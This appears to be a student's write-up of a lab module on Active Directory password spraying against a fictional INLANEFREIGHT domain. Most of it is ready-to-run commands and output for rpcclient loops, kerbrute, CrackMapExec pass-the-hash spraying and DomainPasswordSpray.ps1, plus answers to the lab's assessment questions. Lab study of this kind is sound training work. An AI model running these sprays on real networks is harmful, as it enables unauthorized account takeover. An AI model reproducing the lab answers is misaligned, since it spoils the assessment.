---
description: >-
  Previous section we already created a wordlist, now we can execute our attack
  using windows and linux.
---

# Spraying

## Internal Password Spraying - from Linux

**Using a Rpcclient + Bash one-liner for the Attack**

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

As seen, we performed grep with the password spraying attack to filter all the failed attempts and show only successful connection.

**Using Kerbrute for the Attack**

```shell-session
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

**Using CrackMapExec & Filtering Logon Failures**

```shell-session
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

**Validating the Credentials with CrackMapExec**

```shell-session
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

There is a possibility that the password is being reused in multiple accounts throughout the domain users. If we are able to guess the password or compromise one we can try with same password on their admin account (if they have one).&#x20;

In some case we might only get a NTLM has for local admin account from local SAM DB. we can spray the NT hash across the subnet to hunt for local administrator accounts with same password.

**Local Admin Spraying with CrackMapExec**

```shell-session
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

* \--local-auth -> only attemtp to login one time on heach machine (to avoid lockouts)

## Linux - Assessment

Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.

```
sbrown@inlanefreight.local
srosario@inlanefreight.local
sinman@inlanefreight.local
strent@inlanefreight.local
sgage@inlanefreight.local
```

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 svalid_user.txt  Welcome1                      

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 07/03/23 - Ronnie Flathers @ropnop

2023/07/03 04:09:08 >  Using KDC(s):
2023/07/03 04:09:08 >   172.16.5.5:88

2023/07/03 04:09:08 >  [+] VALID LOGIN:  sgage@inlanefreight.local:Welcome1
2023/07/03 04:09:08 >  Done! Tested 5 logins (1 successes) in 0.050 seconds
```

**sgage@inlanefreight.local:Welcome1**

## Internal Password Spraying - from Windows

**Using DomainPasswordSpray.ps1**

```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

## Windows - Assessment

Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.

```
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption><p>User:dbranch Password:Winter2022</p></figcaption></figure>













